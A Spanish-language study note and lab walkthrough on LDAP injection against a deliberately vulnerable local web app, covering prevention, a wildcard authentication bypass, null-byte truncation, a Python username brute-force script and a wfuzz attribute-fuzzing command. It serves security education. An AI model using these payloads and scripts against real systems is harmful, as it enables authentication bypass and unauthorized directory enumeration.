---
aliases:
  - LDAP Injection
  - Inyección LDAP
tags:
  - hacking/explotacion
  - hacking/web
  - hacking/laboratorios
  - hacking/herramientas
  - scripting/python
  - linux/comandos
  - redes/protocolos
estado: 🟢 Terminado
---
# Inyecciones LDAP (Protocolo Ligero de Acceso a Directorios)

Las inyecciones **LDAP** (**Protocolo Ligero de Acceso a Directorios**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un servicio de directorio que se utiliza para almacenar y organizar información de usuarios, grupos y recursos en una red, facilitando su acceso y gestión.

> [!info] ¿Qué es LDAP?
> LDAP (Lightweight Directory Access Protocol) es un protocolo estándar de la industria para acceder y mantener servicios de información de directorio distribuidos a través de una red IP. Los directorios LDAP se utilizan comúnmente para almacenar información de autenticación (nombres de usuario y contraseñas), información de contacto y otros datos de recursos de red.

La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para validar y sanear la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

> [!warning] Impacto de las Inyecciones LDAP
> Las inyecciones LDAP pueden ser tan peligrosas como las inyecciones SQL o NoSQL, ya que permiten la manipulación directa de un servicio de directorio crítico. Un ataque exitoso puede comprometer la seguridad de toda la infraestructura de red.

Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

-   Acceder a información de usuarios o recursos a los que no debería tener acceso.
-   Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar, modificar o eliminar usuarios o recursos.
-   Realizar operaciones maliciosas en la red, como lanzar ataques de phishing, escalar privilegios o instalar software malicioso en los sistemas de la red.

Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

> [!tip] Medidas de Prevención Adicionales
> Además de la validación de entrada, es crucial implementar el principio de mínimos privilegios para las cuentas de servicio que interactúan con el servidor LDAP. También se recomienda el uso de sentencias preparadas o APIs de acceso a directorios que manejen automáticamente el escape de caracteres, similar a cómo se previenen las inyecciones SQL. El monitoreo regular de los logs del servidor LDAP puede ayudar a detectar actividades sospechosas.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.

A continuación, se proporciona el enlace directo al proyecto de GitHub que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:

-   **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

## Notas de la Práctica

![[Pasted image 20260227111747.png]]

Esta es la interfaz web donde vamos a practicar.

Vamos a utilizar la herramienta de línea de comandos `ldapsearch` para interactuar con el servidor LDAP. El primer paso es realizar una búsqueda básica:

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

![[Pasted image 20260227112145.png]]

Analicemos los parámetros de este comando:
-   `-x`: Indica que se utilizará una autenticación simple (usuario y contraseña).
-   `-H ldap://localhost`: Especifica el host y el puerto del servidor LDAP al que nos conectamos.
-   `-b dc=example,dc=org`: Define la base de búsqueda (Base DN). En este caso, fragmentamos el dominio `example.org` en `dc=example,dc=org`.
> [!info] Enumeración de la Base DN
    > Para descubrir la Base DN de un servidor LDAP, es común realizar una enumeración previa. Herramientas como `nmap` con scripts específicos pueden ser muy útiles. Por ejemplo, `nmap --script ldap\* -p389 localhost` puede revelar información valiosa sobre la estructura del directorio.
-   `-D "cn=admin,dc=example,dc=org"`: Especifica el Distinguished Name (DN) del usuario con el que intentamos autenticarnos. Es la forma de indicarle al servidor qué usuario queremos utilizar para la autenticación.
-   `-w admin`: Proporciona la contraseña para el usuario especificado con `-D`.
-   `'cn=admin'`: Este es nuestro criterio de búsqueda o filtro LDAP. Busca entradas donde el atributo `cn` (Common Name) sea `admin`.

![[Pasted image 20260227112553.png]]

Ahora, podemos hacer este criterio de búsqueda o filtro más complejo, que es lo que la aplicación web podría estar haciendo internamente. Podemos concatenar operadores lógicos como `and` (`&`) u `or` (`|`) para realizar búsquedas más específicas. Por ejemplo:

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP administrator))'
```

![[Pasted image 20260227113442.png]]

Si el filtro no coincide con ninguna entrada, la búsqueda fallará o no devolverá resultados:

![[Pasted image 20260227113529.png]]

> [!info] Sintaxis de Filtros LDAP
> Los filtros LDAP utilizan una notación de prefijo polaca (Polish notation). Los operadores lógicos (`&` para AND, `|` para OR, `!` para NOT) preceden a los pares de atributos y valores. La estructura general es `(operador(atributo=valor)(atributo=valor)...)`. Por ejemplo, `(&(cn=admin)(description=LDAP administrator))` busca entradas donde el `cn` es `admin` Y la `description` es `LDAP administrator`.

La estructura para facilitar la comprensión de los filtros también se puede visualizar como:
![[Pasted image 20260227114454.png]]

### Bypass de Autenticación con Comodines (`*`)

Ahora, ¿qué sucede si en lugar de pasar una contraseña directamente, le pasamos un comodín `*` que engloba todas las posibilidades?

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```
*(Nota: El comando anterior es el original, para el bypass se modificaría la contraseña o el filtro en la aplicación web)*

En la aplicación web, si inyectamos `*` en el campo de contraseña, o en el campo de usuario de forma que el filtro LDAP resultante sea `(uid=admin)(password=*)` o similar, podríamos lograr un bypass.

![[Pasted image 20260227114609.png]]
![[Pasted image 20260227114618.png]]

Al ingresar `admin` como usuario y `*` como contraseña, logramos autenticarnos como el usuario `admin`. Esto indica una vulnerabilidad de inyección LDAP donde el comodín `*` se interpreta directamente en el filtro LDAP.

### Inyección LDAP con Burp Suite

Vamos a utilizar Burp Suite para analizar y manipular las peticiones HTTP.

![[Pasted image 20260227115028.png]]

Podemos observar la petición POST. En este caso particular de la aplicación web, una respuesta correcta o una inyección exitosa a menudo se manifiesta como un `open redirect` con un código de estado `301`. Podemos verificarlo haciendo la inyección inicial:

![[Pasted image 20260227115227.png]]

Como podemos observar, obtenemos el `redirect` (código de estado 301), lo que confirma que la inyección fue exitosa.

Podemos utilizar el comodín `*` para ir construyendo usuarios y contraseñas de forma incremental. Por ejemplo, con `a*` en el campo de usuario, le indicamos que busque usuarios que comiencen con `a` y luego cualquier secuencia de caracteres:

![[Pasted image 20260227115325.png]]

Podemos observar que es válido. Esta es una vía potencial para ir armando el nombre de usuario y, eventualmente, la contraseña mediante técnicas de fuerza bruta o adivinación.

![[Pasted image 20260227115553.png]]

Existen múltiples posibilidades para explotar esto, y a menudo implica técnicas de fuerza bruta o fuzzing para descubrir usuarios, contraseñas o atributos.

### Inyección con Null Byte (`%00`)

Mediante diferentes inyecciones y al intentar reconocer la estructura de la aplicación web, podemos intentar cerrar una consulta en el campo de usuario y, mediante un null byte (`%00`), hacer que el resto de la petición (como la contraseña) no se interprete. Esto es similar a "comentar" una parte de la consulta para que no afecte la lógica de autenticación.

![[Pasted image 20260227120335.png]]

Como podemos observar, al inyectar `admin%00` en el campo de usuario, la autenticación es válida, lo que sugiere que el null byte truncó la cadena de consulta LDAP, ignorando la parte de la contraseña.

### Enumeración de Usuarios con Fuerza Bruta

Comenzaremos con la enumeración de usuarios, suponiendo que no conocemos la contraseña, pero sabemos que el uso de `*` es válido para el bypass. La inyección quedaría de la siguiente manera:

![[Pasted image 20260227121415.png]]

Con este concepto, vamos a crear un script en Python que nos permita realizar fuerza bruta y descubrir usuarios.

```python
#!/usr/bin/python3

import requests, time, sys, signal, string

# from pwn import * # La librería pwn no se utiliza en el script, se puede comentar o eliminar si no es necesaria.

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
main_url="http://localhost:8888"

def def_handler(sig, frame):
    print(f"\n\n[!] Saliendo ......\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def getInitialUsers():

    characters =string.ascii_lowercase # Define los caracteres a probar (letras minúsculas)

    initial_users = [] # Lista para almacenar los caracteres iniciales válidos

    print("[*] Buscando caracteres iniciales de usuarios...")
    for character in characters:
        # Construye el payload para la petición POST
        # user_id={caracter}*&password=*&login=1&submit=Submit
        post_data="user_id={}*&password=*&login=1&submit=Submit".format(character)

        # Realiza la petición POST
        r = requests.post(main_url, data=post_data, headers=headers,
                          allow_redirects=False) # No seguir redirecciones automáticamente

        # Si el código de estado es 301 (redirección), significa que el prefijo es válido
        if r.status_code == 301:
            print(f"    [+] Carácter inicial válido encontrado: {character}")
            initial_users.append(character)

    return initial_users

def getUsers(users):
    
    characters = string.ascii_lowercase # Define los caracteres a probar
    valid_users = [] # Lista para almacenar los usuarios completos encontrados

    print("\n[*] Enumerando usuarios completos...")
    for first_character in users:
        user = ""
        user =first_character # Empieza con el carácter inicial válido
        
        # Itera para construir el resto del nombre de usuario
        for position in range(0,15): # Limita la longitud máxima del usuario a 15 caracteres adicionales
            found_char_for_position = False
            for character in characters:
                # Construye el payload con el usuario parcial y el siguiente carácter a probar
                post_data="user_id={}{}*&password=*&login=1&submit=Submit".format(user,character)

                r = requests.post(main_url, data=post_data, headers=headers,
                          allow_redirects=False)

                if r.status_code ==301: # Si hay redirección, el carácter es válido
                    user +=character # Añade el carácter al nombre de usuario
                    found_char_for_position = True
                    break # Pasa a la siguiente posición del nombre de usuario
            
            if not found_char_for_position: # Si no se encuentra ningún carácter para la posición actual, el usuario está completo
                break

        valid_users.append(user) # Añade el usuario completo a la lista
        print(f"    [+] Usuario encontrado: {user}")

    return valid_users



if __name__ == '__main__':
    initial_users = getInitialUsers()
    # print(initial_users) # Descomentar para ver los caracteres iniciales
    valid_users = getUsers(initial_users)
    print(f"\n[+] Usuarios válidos encontrados: {valid_users}")
```

> [!info] `allow_redirects=False` en `requests`
> En el script de Python, `allow_redirects=False` es crucial. La aplicación vulnerable responde con un código de estado `301 Moved Permanently` cuando la inyección es exitosa. Si `allow_redirects` fuera `True` (por defecto), la librería `requests` seguiría automáticamente la redirección, y el `status_code` de la respuesta final sería `200 OK`, lo que dificultaría la detección de la inyección exitosa. Al deshabilitar las redirecciones, podemos inspeccionar el código de estado `301` directamente.

![[Pasted image 20260227135242.png]]

Podríamos adornar mucho más la salida y extenderla con diferentes apartados, pero eso ya queda a preferencia de cada uno.

Se podría implementar, como ya conocemos, de la siguiente manera para obtener información como la descripción:
![[Pasted image 20260227135452.png]]

### Fuzzing de Atributos LDAP con Wfuzz

Ahora vamos a realizar fuzzing intentando encontrar atributos válidos en el sistema, recordando que nos acepta el comodín `*`. Vamos a crear una estructura de la siguiente manera:

![[Pasted image 20260227121706.png]]

En este caso, el `FUZZ` se engloba en el filtro LDAP, permitiéndonos buscar por diferentes atributos. Para que el fuzzing sea efectivo, necesitamos identificar una condición que diferencie una respuesta válida de una errónea (por ejemplo, un código de estado HTTP, una longitud de respuesta, o un contenido específico).

En nuestro caso, jugamos con el código de estado HTTP `301` (redirección) para identificar atributos válidos.

```bash
wfuzz --hc=200 -c -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' -u http://172.17.0.1:8888/
```

-   `--hc=200`: Oculta las respuestas con código de estado `200 OK`. Esto nos permite ver solo las respuestas que no son `200 OK`, que en este laboratorio son las `301` (éxito).
-   `-c`: Muestra la salida con colores.
-   `-w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt`: Especifica el diccionario de palabras a utilizar para el fuzzing de atributos.
-   `-d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit'`: Define los datos POST. `FUZZ` será reemplazado por cada palabra del diccionario. La inyección `admin)(FUZZ=*))%00` intenta cerrar el filtro de usuario actual, insertar un nuevo filtro con el atributo `FUZZ` y luego un comodín `*`, y finalmente el null byte `%00` para ignorar el resto de la consulta.
-   `-u http://172.17.0.1:8888/`: Especifica la URL objetivo.

![[Pasted image 20260227125921.png]]

Podemos ver cómo hemos filtrado por varios atributos, que son muchos. Esto nos permite descubrir qué atributos son reconocidos por el servidor LDAP, lo cual es crucial para futuras inyecciones y enumeraciones de información.